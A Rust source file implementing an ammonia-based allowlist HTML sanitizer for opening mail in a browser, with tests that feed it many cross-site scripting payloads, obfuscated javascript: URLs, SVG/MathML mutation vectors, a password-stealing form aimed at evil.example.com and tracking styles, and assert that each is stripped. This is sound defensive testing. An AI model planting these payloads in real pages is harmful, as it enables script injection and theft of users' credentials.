//! HTML for "Open in browser": an allowlist sanitizer on top of the CSP.
//!
//! The page the binary writes already carries a Content-Security-Policy
//! that blocks scripts, forms, frames and remote loads. This pass removes
//! the dangerous markup itself, so the page stays safe in a browser that
//! ignores the policy, and so nothing in the mail can try to undo it.
//!
//! It uses ammonia, which parses with html5ever like the rest of this
//! crate and allows only what is listed: everything else is dropped.
//!
//! - Scripts, styles, frames, objects, embeds, forms and their controls,
//!   `meta` (refresh), `base`, `link`, SVG and MathML are removed. Element
//!   types whose text would leak (`script`, `style`, `title`, `textarea`,
//!   ...) go with their content; other unknown elements are unwrapped.
//! - Event handlers and every attribute not listed are removed, so are
//!   `id`, `class`, `srcset` and the `background` attribute.
//! - Links keep only `http`, `https` and `mailto` targets and get
//!   `rel="noopener noreferrer"`. Relative links are dropped: the page is a
//!   local file, where they would point into the file system.
//! - Images keep `cid:` and `data:` raster images. Remote images stay only
//!   when the caller allows them, the same rule the CSP applies.
//! - `style` attributes keep only properties that cannot load anything.

use std::borrow::Cow;
use std::collections::HashSet;

use crate::nesting::limit_nesting;

/// Elements deeper than this are flattened first, as for rendering, so a
/// hostile document cannot make parsing slow or the tree walk deep.
const MAX_DEPTH: usize = 256;

/// Elements kept, without their attributes unless listed below.
const TAGS: &[&str] = &[
    "a",
    "abbr",
    "address",
    "article",
    "aside",
    "b",
    "bdi",
    "bdo",
    "big",
    "blockquote",
    "br",
    "caption",
    "center",
    "cite",
    "code",
    "col",
    "colgroup",
    "dd",
    "del",
    "details",
    "dfn",
    "div",
    "dl",
    "dt",
    "em",
    "figcaption",
    "figure",
    "font",
    "footer",
    "h1",
    "h2",
    "h3",
    "h4",
    "h5",
    "h6",
    "header",
    "hr",
    "i",
    "img",
    "ins",
    "kbd",
    "li",
    "main",
    "mark",
    "nav",
    "ol",
    "p",
    "pre",
    "q",
    "rp",
    "rt",
    "ruby",
    "s",
    "samp",
    "section",
    "small",
    "span",
    "strike",
    "strong",
    "sub",
    "summary",
    "sup",
    "table",
    "tbody",
    "td",
    "tfoot",
    "th",
    "thead",
    "time",
    "tr",
    "tt",
    "u",
    "ul",
    "var",
    "wbr",
];

/// Elements removed with everything inside them. Their content is code,
/// a frame, a form control or text that is not part of the message.
const DROP_WITH_CONTENT: &[&str] = &[
    "applet", "button", "embed", "frame", "frameset", "head", "iframe", "math", "noembed",
    "noframes", "noscript", "object", "script", "select", "style", "svg", "template", "textarea",
    "title", "xmp",
];

/// Attributes allowed on every kept element.
const GENERIC_ATTRIBUTES: &[&str] = &[
    "align",
    "bgcolor",
    "border",
    "cellpadding",
    "cellspacing",
    "color",
    "dir",
    "height",
    "lang",
    "style",
    "title",
    "valign",
    "width",
];

/// Attributes allowed on some elements only.
const TAG_ATTRIBUTES: &[(&str, &[&str])] = &[
    ("a", &["href"]),
    ("img", &["src", "alt"]),
    (
        "td",
        &["colspan", "rowspan", "nowrap", "abbr", "headers", "scope"],
    ),
    (
        "th",
        &["colspan", "rowspan", "nowrap", "abbr", "headers", "scope"],
    ),
    ("table", &["summary"]),
    ("col", &["span"]),
    ("colgroup", &["span"]),
    ("font", &["face", "size"]),
    ("ol", &["start", "type", "reversed"]),
    ("ul", &["type"]),
    ("li", &["value", "type"]),
    ("time", &["datetime"]),
    ("del", &["datetime"]),
    ("ins", &["datetime"]),
    ("details", &["open"]),
];

/// URL schemes ammonia lets through at all. `data:` and `cid:` are then
/// limited to images by [`url_allowed`].
const URL_SCHEMES: &[&str] = &["http", "https", "mailto", "cid", "data"];

/// CSS properties kept in `style` attributes. None of them can hold a
/// `url()`, so a style cannot load anything; `background`, `list-style`,
/// `content`, `cursor` and the like are left out for that reason, and
/// `position` so mail cannot lay a fake dialog over the page.
const STYLE_PROPERTIES: &[&str] = &[
    "background-color",
    "border",
    "border-bottom",
    "border-collapse",
    "border-color",
    "border-left",
    "border-radius",
    "border-right",
    "border-spacing",
    "border-style",
    "border-top",
    "border-width",
    "clear",
    "color",
    "direction",
    "display",
    "float",
    "font",
    "font-family",
    "font-size",
    "font-style",
    "font-variant",
    "font-weight",
    "height",
    "letter-spacing",
    "line-height",
    "list-style-type",
    "margin",
    "margin-bottom",
    "margin-left",
    "margin-right",
    "margin-top",
    "max-height",
    "max-width",
    "min-height",
    "min-width",
    "padding",
    "padding-bottom",
    "padding-left",
    "padding-right",
    "padding-top",
    "table-layout",
    "text-align",
    "text-decoration",
    "text-indent",
    "text-transform",
    "vertical-align",
    "white-space",
    "width",
    "word-break",
    "word-spacing",
];

/// Raster image types a `data:` image may have. SVG is left out: it is a
/// document, not a picture.
const DATA_IMAGES: &[&str] = &[
    "data:image/png",
    "data:image/gif",
    "data:image/jpeg",
    "data:image/jpg",
    "data:image/webp",
    "data:image/bmp",
];

/// Cleans an HTML body for a page opened in the browser. Remote images are
/// kept only when `remote_images` is true. Returns body content, without
/// `html`, `head` or `body` tags, for the caller to wrap in its page and
/// its CSP.
pub fn sanitize_for_browser(html: &str, remote_images: bool) -> String {
    let input = limit_nesting(html, MAX_DEPTH);
    builder(remote_images).clean(&input).to_string()
}

fn set(items: &[&'static str]) -> HashSet<&'static str> {
    items.iter().copied().collect()
}

fn builder(remote_images: bool) -> ammonia::Builder<'static> {
    let mut b = ammonia::Builder::default();
    b.tags(set(TAGS))
        .clean_content_tags(set(DROP_WITH_CONTENT))
        .generic_attributes(set(GENERIC_ATTRIBUTES))
        .tag_attributes(
            TAG_ATTRIBUTES
                .iter()
                .map(|(tag, attrs)| (*tag, set(attrs)))
                .collect(),
        )
        .generic_attribute_prefixes(HashSet::new())
        .url_schemes(set(URL_SCHEMES))
        .url_relative(ammonia::UrlRelative::Deny)
        .link_rel(Some("noopener noreferrer"))
        .strip_comments(true)
        .filter_style_properties(set(STYLE_PROPERTIES))
        .attribute_filter(
            move |element, attribute, value| match (element, attribute) {
                ("a", "href") | ("img", "src") => {
                    url_allowed(element, value, remote_images).then_some(Cow::Borrowed(value))
                }
                _ => Some(Cow::Borrowed(value)),
            },
        );
    b
}

/// Whether a link or image URL may stay. The URL is read the way a browser
/// reads it: tabs and line breaks anywhere are ignored, as are spaces and
/// control characters at either end, and the scheme is case-insensitive.
fn url_allowed(element: &str, value: &str, remote_images: bool) -> bool {
    let url: String = value
        .chars()
        .filter(|c| !matches!(c, '\t' | '\n' | '\r'))
        .collect();
    let url = url
        .trim_matches(|c: char| c == ' ' || c.is_ascii_control())
        .to_ascii_lowercase();
    let remote = url.starts_with("http://") || url.starts_with("https://");
    match element {
        "a" => remote || url.starts_with("mailto:"),
        "img" => {
            (remote && remote_images)
                || url.starts_with("cid:")
                || DATA_IMAGES.iter().any(|t| {
                    url.strip_prefix(t)
                        .is_some_and(|rest| rest.starts_with(';') || rest.starts_with(','))
                })
        }
        _ => false,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn clean(html: &str) -> String {
        sanitize_for_browser(html, false)
    }

    /// The tags in sanitized output with their attributes, values decoded.
    /// Output is ammonia's serialization: names are lower case and every
    /// value is double quoted, with `"` escaped inside.
    fn tags_in(out: &str) -> Vec<(String, Vec<(String, String)>)> {
        let decode = |v: &str| {
            v.replace("&quot;", "\"")
                .replace("&lt;", "<")
                .replace("&gt;", ">")
                .replace("&#39;", "'")
                .replace("&nbsp;", "\u{a0}")
                .replace("&amp;", "&")
        };
        let mut tags = Vec::new();
        let mut rest = out;
        while let Some(open) = rest.find('<') {
            let tag = &rest[open + 1..];
            let close = tag.find('>').expect("a closed tag");
            let body = tag[..close].trim_start_matches('/').trim_end_matches('/');
            let name: String = body
                .chars()
                .take_while(|c| c.is_ascii_alphanumeric())
                .collect();
            let mut attrs = Vec::new();
            let mut a = body[name.len()..].trim_start();
            while !a.is_empty() {
                let end = a
                    .find(|c: char| c == '=' || c.is_ascii_whitespace())
                    .unwrap_or(a.len());
                let attr = a[..end].to_owned();
                a = &a[end..];
                let mut value = String::new();
                if let Some(v) = a.strip_prefix("=\"") {
                    let q = v.find('"').expect("a closed value");
                    value = decode(&v[..q]);
                    a = &v[q + 1..];
                }
                attrs.push((attr, value));
                a = a.trim_start();
            }
            tags.push((name, attrs));
            rest = &tag[close + 1..];
        }
        tags
    }

    /// Markup that must never survive, in any case or spelling: every tag
    /// left is a kept one, every attribute is a listed one, and links,
    /// images and styles point nowhere they should not.
    fn assert_inert(out: &str) {
        // Written out again here, so a slip in the allowlist shows.
        const NEVER: &[&str] = &[
            "applet", "audio", "base", "body", "button", "embed", "form", "frame", "frameset",
            "head", "html", "iframe", "input", "link", "math", "meta", "noscript", "object",
            "option", "param", "script", "select", "source", "style", "svg", "template",
            "textarea", "title", "video",
        ];
        for (tag, attrs) in tags_in(out) {
            assert!(TAGS.contains(&tag.as_str()), "<{tag}> survived in {out:?}");
            assert!(
                !NEVER.contains(&tag.as_str()),
                "<{tag}> survived in {out:?}"
            );
            let extra = TAG_ATTRIBUTES
                .iter()
                .find(|(t, _)| *t == tag)
                .map_or(&[][..], |(_, a)| *a);
            for (attr, value) in attrs {
                let listed = GENERIC_ATTRIBUTES.contains(&attr.as_str())
                    || extra.contains(&attr.as_str())
                    || (tag == "a" && attr == "rel");
                assert!(listed, "{attr} on <{tag}> survived in {out:?}");
                match attr.as_str() {
                    "href" | "src" => {
                        let v: String = value
                            .to_ascii_lowercase()
                            .chars()
                            .filter(|c| !c.is_ascii_whitespace() && !c.is_ascii_control())
                            .collect();
                        let safe = ["http://", "https://", "mailto:", "cid:", "data:image/"]
                            .iter()
                            .any(|p| v.starts_with(p))
                            && !v.starts_with("data:image/svg");
                        assert!(safe, "{attr}={value:?} survived in {out:?}");
                    }
                    "style" => {
                        let v = value.to_ascii_lowercase();
                        assert!(
                            !v.contains("url(") && !v.contains("expression") && !v.contains('\\'),
                            "style {value:?} survived in {out:?}"
                        );
                    }
                    "rel" => assert_eq!(value, "noopener noreferrer"),
                    _ => {}
                }
            }
        }
    }

    #[test]
    fn the_builder_configuration_is_valid() {
        // ammonia panics at clean time on contradictory settings, such as
        // a tag that is both kept and dropped, or `rel` allowed while
        // `link_rel` is set. Every setting goes through here.
        for remote in [false, true] {
            assert_eq!(sanitize_for_browser("", remote), "");
            assert_eq!(sanitize_for_browser("<p>hi</p>", remote), "<p>hi</p>");
        }
        let tags = set(TAGS);
        assert!(DROP_WITH_CONTENT.iter().all(|t| !tags.contains(t)));
    }

    #[test]
    fn mail_formatting_is_kept() {
        let html = r##"<table width="600" cellpadding="4" bgcolor="#ffffff" align="center"><tr><td colspan="2" valign="top" style="color: #333; font-size: 14px; padding: 8px">Hello <b>Mira</b>, <i>see</i> <a href="https://garden.example.com/rota">the rota</a>.</td></tr></table><blockquote><p>Quoted</p></blockquote><ul><li>One</li></ul><font face="Arial" color="red" size="2">Old</font><img src="cid:logo@example.com" alt="Logo" width="80">"##;
        let out = clean(html);
        for kept in [
            r##"<table width="600" cellpadding="4" bgcolor="#ffffff" align="center">"##,
            r##"<td colspan="2" valign="top" style="color:#333;font-size:14px;padding:8px">"##,
            "<b>Mira</b>",
            r#"<a href="https://garden.example.com/rota" rel="noopener noreferrer">the rota</a>"#,
            "<blockquote><p>Quoted</p></blockquote>",
            "<ul><li>One</li></ul>",
            r#"<font face="Arial" color="red" size="2">Old</font>"#,
            r#"<img src="cid:logo@example.com" alt="Logo" width="80">"#,
        ] {
            assert!(out.contains(kept), "{kept:?} missing from {out:?}");
        }
    }

    #[test]
    fn scripts_and_their_text_are_gone() {
        for html in [
            "<script>alert(1)</script>ok",
            "<SCRIPT SRC=//evil.example.com/x.js></SCRIPT>ok",
            "<script>/*</script><script>*/alert(1)</script>ok",
            "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\"></noscript>ok",
            "<style>body{background:url(https://evil.example.com/t)}</style>ok",
            "<title>Phish</title>ok",
            "<template><script>alert(1)</script></template>ok",
            "<textarea><script>alert(1)</script></textarea>ok",
            "<xmp><script>alert(1)</script></xmp>ok",
            "<!--<script>alert(1)</script>-->ok",
        ] {
            let out = clean(html);
            assert_inert(&out);
            assert!(!out.contains("alert"), "{html:?} -> {out:?}");
            assert!(!out.contains("Phish"), "{html:?} -> {out:?}");
            assert!(out.ends_with("ok"), "{html:?} -> {out:?}");
        }
    }

    #[test]
    fn event_handlers_and_unknown_attributes_are_gone() {
        for html in [
            r#"<p onclick="alert(1)">x</p>"#,
            r#"<p ONMOUSEOVER=alert(1)>x</p>"#,
            r#"<p onclick = 'alert(1)' >x</p>"#,
            r#"<p/onclick=alert(1)>x</p>"#,
            r#"<p id="a" class="b" name="c" data-x="1" onclick="alert(1)">x</p>"#,
            r#"<img src="cid:a" onerror="alert(1)" onload=alert(1)>"#,
            r#"<a href="https://example.com" onfocus="alert(1)" autofocus target="_top">x</a>"#,
            r#"<body onload="alert(1)">x</body>"#,
            r#"<p """ onclick="alert(1)">x</p>"#,
            r#"<p x="y"onclick="alert(1)">x</p>"#,
            "<p\nonclick=alert(1)>x</p>",
            "<details open ontoggle=alert(1)>x</details>",
        ] {
            let out = clean(html);
            assert_inert(&out);
            assert!(!out.contains("alert"), "{html:?} -> {out:?}");
            for attr in ["id=", "class=", "name=", "data-x", "autofocus", "target="] {
                assert!(!out.contains(attr), "{attr} in {html:?} -> {out:?}");
            }
        }
    }

    #[test]
    fn script_urls_are_gone_however_they_are_spelled() {
        for href in [
            "javascript:alert(1)",
            "JaVaScRiPt:alert(1)",
            " javascript:alert(1)",
            "\u{1}javascript:alert(1)",
            "java\tscript:alert(1)",
            "java\nscript:alert(1)",
            "&#106;avascript:alert(1)",
            "&#x6A;avascript:alert(1)",
            "&#0000106avascript:alert(1)",
            "javascript&colon;alert(1)",
            "jav&#x09;ascript:alert(1)",
            "vbscript:msgbox(1)",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "data:image/svg+xml,<svg onload=alert(1)>",
            "file:///etc/passwd",
            "../../etc/passwd",
            "//evil.example.com/x",
            "#top",
        ] {
            let html = format!(r#"<a href="{href}">x</a><img src="{href}">"#);
            let out = clean(&html);
            assert_inert(&out);
            assert!(!out.contains("href"), "{href:?} -> {out:?}");
            assert!(!out.contains("src"), "{href:?} -> {out:?}");
        }
    }

    #[test]
    fn links_keep_web_and_mail_targets() {
        let out = clean(
            r#"<a href="HTTPS://Garden.example.com/a?b=1&amp;c=2">a</a><a href="mailto:rota@example.org">b</a><a href=" https://example.com/x ">c</a>"#,
        );
        assert!(
            out.contains(r#"href="HTTPS://Garden.example.com/a?b=1&amp;c=2""#),
            "{out}"
        );
        assert!(out.contains(r#"href="mailto:rota@example.org""#), "{out}");
        assert_eq!(
            out.matches(r#"rel="noopener noreferrer""#).count(),
            3,
            "{out}"
        );
        // A link cannot bring its own rel, such as `opener`.
        let out = clean(r#"<a href="https://example.com" rel="opener">x</a>"#);
        assert!(!out.contains("opener\""), "{out}");
    }

    #[test]
    fn remote_images_follow_the_setting() {
        let html = r#"<img src="https://img.example.com/a.png" alt="A"><img src="http://img.example.com/b.png"><img srcset="https://img.example.com/c.png 2x"><table background="https://img.example.com/bg.png"><tr><td>x</td></tr></table>"#;
        let blocked = sanitize_for_browser(html, false);
        assert!(!blocked.contains("img.example.com"), "{blocked}");
        assert!(blocked.contains(r#"<img alt="A">"#), "{blocked}");
        let allowed = sanitize_for_browser(html, true);
        assert!(
            allowed.contains(r#"src="https://img.example.com/a.png""#),
            "{allowed}"
        );
        assert!(allowed.contains(r#"src="http://img.example.com/b.png""#));
        // Never through srcset or background, which the setting does not
        // cover.
        assert!(!allowed.contains("c.png"), "{allowed}");
        assert!(!allowed.contains("bg.png"), "{allowed}");
        // Embedded raster images always stay.
        let png = "data:image/png;base64,iVBORw0KGgo=";
        assert!(clean(&format!(r#"<img src="{png}">"#)).contains(png));
        assert!(clean(r#"<img src="DATA:IMAGE/GIF;base64,R0lGOD==">"#).contains("src="));
        assert!(!clean(r#"<img src="data:image/pngx;base64,AA==">"#).contains("src="));
        assert!(!clean(r#"<a href="data:image/png;base64,AA==">x</a>"#).contains("href"));
    }

    #[test]
    fn styles_cannot_load_or_overlay() {
        for style in [
            "background: url(https://evil.example.com/t.png)",
            "background-image: url(https://evil.example.com/t.png)",
            "list-style: url(https://evil.example.com/t.png)",
            "list-style-image: url(https://evil.example.com/t.png)",
            "content: url(https://evil.example.com/t.png)",
            "cursor: url(https://evil.example.com/t.cur), auto",
            "border-image: url(https://evil.example.com/t.png) 30",
            "behavior: url(x.htc)",
            "-moz-binding: url(x.xml#y)",
            "position: fixed; top: 0; left: 0",
            "b\\61 ckground: url(https://evil.example.com/t.png)",
        ] {
            let out = clean(&format!(r#"<p style="{style}">x</p>"#));
            assert!(!out.contains("evil"), "{style:?} -> {out:?}");
            assert!(!out.contains("url("), "{style:?} -> {out:?}");
            assert!(!out.contains("position"), "{style:?} -> {out:?}");
            assert!(!out.contains("htc"), "{style:?} -> {out:?}");
        }
        let out =
            clean(r##"<p style="color: red; background-color: #eee; position: absolute">x</p>"##);
        assert!(out.contains("color:red"), "{out}");
        assert!(out.contains("background-color:#eee"), "{out}");
    }

    #[test]
    fn forms_frames_and_page_control_are_gone() {
        for html in [
            r#"<form action="https://evil.example.com/steal" method="post"><input name="password" type="password"><button>Log in</button></form>ok"#,
            r#"<form><select><option>a</option></select><textarea>t</textarea><label>Name</label></form>ok"#,
            r#"<iframe src="https://evil.example.com"></iframe>ok"#,
            r#"<iframe srcdoc="<script>alert(1)</script>"></iframe>ok"#,
            r#"<frameset><frame src="https://evil.example.com"></frameset>ok"#,
            r#"<object data="https://evil.example.com/x.swf"><param name="a" value="b"></object>ok"#,
            r#"<embed src="https://evil.example.com/x.swf">ok"#,
            r#"<applet code="X.class"></applet>ok"#,
            r#"<meta http-equiv="refresh" content="0;url=https://evil.example.com">ok"#,
            r#"<META HTTP-EQUIV=REFRESH CONTENT="0; URL=javascript:alert(1)">ok"#,
            r#"<base href="https://evil.example.com/">ok"#,
            r#"<link rel="stylesheet" href="https://evil.example.com/x.css">ok"#,
            r#"<link rel="import" href="https://evil.example.com/x.html">ok"#,
            r#"<a href="https://example.com" ping="https://evil.example.com/p">ok</a>"#,
            r#"<video src="https://evil.example.com/v.mp4" poster="https://evil.example.com/p.png"></video><audio src="https://evil.example.com/a.mp3"></audio>ok"#,
            r#"<picture><source srcset="https://evil.example.com/a.png"><img src="cid:a"></picture>ok"#,
        ] {
            let out = clean(html);
            assert_inert(&out);
            assert!(!out.contains("evil"), "{html:?} -> {out:?}");
            assert!(!out.contains("alert"), "{html:?} -> {out:?}");
            assert!(!out.contains("password"), "{html:?} -> {out:?}");
            assert!(out.contains("ok"), "{html:?} -> {out:?}");
        }
        // The visible text of a form survives; its controls do not.
        let out = clean("<form>Name: <input value=Mira></form>");
        assert_eq!(out, "Name: ");
    }

    #[test]
    fn svg_and_mathml_script_vectors_are_gone() {
        for html in [
            "<svg onload=alert(1)>",
            "<svg><script>alert(1)</script></svg>ok",
            "<svg><a xlink:href=\"javascript:alert(1)\"><text>x</text></a></svg>ok",
            "<svg><animate attributeName=href values=javascript:alert(1) /></svg>ok",
            "<svg><set attributeName=onmouseover to=alert(1) /></svg>ok",
            "<svg><foreignObject><iframe src=javascript:alert(1)></iframe></foreignObject></svg>ok",
            "<svg><style><img src=x onerror=alert(1)></style></svg>ok",
            "<svg></p><style><a id=\"</style><img src=1 onerror=alert(1)>\">ok",
            "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>ok",
            "<math><mi xlink:href=\"javascript:alert(1)\">x</mi></math>ok",
            "<math><maction actiontype=statusline xlink:href=javascript:alert(1)>x</maction></math>ok",
            "<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>ok",
            "<img src=\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+\">ok",
        ] {
            let out = clean(html);
            assert_inert(&out);
            assert!(!out.contains("alert"), "{html:?} -> {out:?}");
            assert!(!out.contains("onerror"), "{html:?} -> {out:?}");
        }
    }

    #[test]
    fn malformed_and_nested_markup_stays_inert() {
        for html in [
            "<<script>alert(1)//<</script>",
            "<scr<script>ipt>alert(1)</script>ok",
            "<![CDATA[<script>alert(1)</script>]]>ok",
            "<img src=x onerror=alert(1)//",
            "<img \"\"\"><script>alert(1)</script>\">",
            "<a href=\"https://example.com\"<script>alert(1)</script>x</a>",
            "<p title=\"a\" title=\"b\" onclick=alert(1)>x",
            "<div><p><b><i><u><s>unclosed",
            "</p></div></table>stray ends",
            "<a href='https://example.com/\"onmouseover=\"alert(1)'>x</a>",
            "<p style=\"color:red\" style=\"background:url(https://evil.example.com)\">x</p>",
            "<img src=`javascript:alert(1)`>",
            "<IMG SRC=\"jav&#x0D;ascript:alert(1);\">",
            "<a href=\"\u{0}javascript:alert(1)\">x</a>",
            "<p>\u{0}<script>alert(1)</script></p>",
            "<scrip\u{0}t>alert(1)</script>",
            "<table><tr><td><table><tr><td><script>alert(1)</script></td></tr></table></td></tr></table>",
            "<isindex action=javascript:alert(1) type=image>",
            "<keygen autofocus onfocus=alert(1)>",
            "<marquee onstart=alert(1)>x</marquee>",
            "<x-custom onclick=alert(1)>custom</x-custom>",
        ] {
            let out = clean(html);
            assert_inert(&out);
            assert!(!out.contains("onmouseover=\""), "{html:?} -> {out:?}");
            assert!(!out.contains("evil"), "{html:?} -> {out:?}");
            // Whatever is left reads back the same: no markup that a second
            // parse would turn into something else.
            assert_eq!(clean(&out), out, "not stable for {html:?}");
        }
        // Text that looks like markup is escaped, not executed.
        assert_eq!(
            clean("&lt;script&gt;alert(1)&lt;/script&gt;"),
            "&lt;script&gt;alert(1)&lt;/script&gt;"
        );
        assert_eq!(clean("a < b & c > d"), "a &lt; b &amp; c &gt; d");
    }

    #[test]
    fn deep_nesting_is_flattened_not_fatal() {
        let depth = 20_000;
        let html = format!(
            "{}<script>alert(1)</script>deep{}",
            "<div>".repeat(depth),
            "</div>".repeat(depth)
        );
        let out = clean(&html);
        assert_inert(&out);
        assert!(out.contains("deep"));
        assert!(out.matches("<div>").count() <= MAX_DEPTH);
        let quotes = format!("{}x", "<blockquote>".repeat(depth));
        assert!(clean(&quotes).contains('x'));
    }

    #[test]
    fn many_random_hostile_documents_stay_inert() {
        // A small deterministic fuzz: random mixes of hostile pieces.
        const PIECES: &[&str] = &[
            "<script>alert(1)</script>",
            "<SCRIPT>",
            "</script>",
            "<svg>",
            "</svg>",
            "<math>",
            "<mtext>",
            "<style>",
            "</style>",
            "<img src=x onerror=alert(1)>",
            "<a href=\"javascript:alert(1)\">",
            "<a href=\"https://example.com\">",
            "</a>",
            "<iframe>",
            "<form>",
            "<textarea>",
            "</textarea>",
            "<noscript>",
            "</noscript>",
            "<!--",
            "-->",
            "<![CDATA[",
            "]]>",
            "<p title=\"",
            "\">",
            "<table>",
            "<td>",
            "text",
            "&lt;",
            "&#60;script&#62;",
            "<meta http-equiv=refresh content=0>",
            "<base href=https://evil.example.com>",
            "<object>",
            "<template>",
            "<select>",
            "<option>",
            "<b onclick=alert(1)>",
            "<x:script>",
            "<foreignObject>",
            "<mglyph>",
            "<desc>",
        ];
        let mut seed: u64 = 0x5eed_1234_abcd_ef01;
        let mut next = || {
            seed ^= seed << 13;
            seed ^= seed >> 7;
            seed ^= seed << 17;
            seed
        };
        for _ in 0..3000 {
            let n = 1 + (next() % 12) as usize;
            let html: String = (0..n)
                .map(|_| PIECES[(next() % PIECES.len() as u64) as usize])
                .collect();
            let out = clean(&html);
            // "alert(1)" may survive as text; never as markup.
            assert_inert(&out);
            assert_eq!(clean(&out), out, "not stable for {html:?}");
        }
    }
}
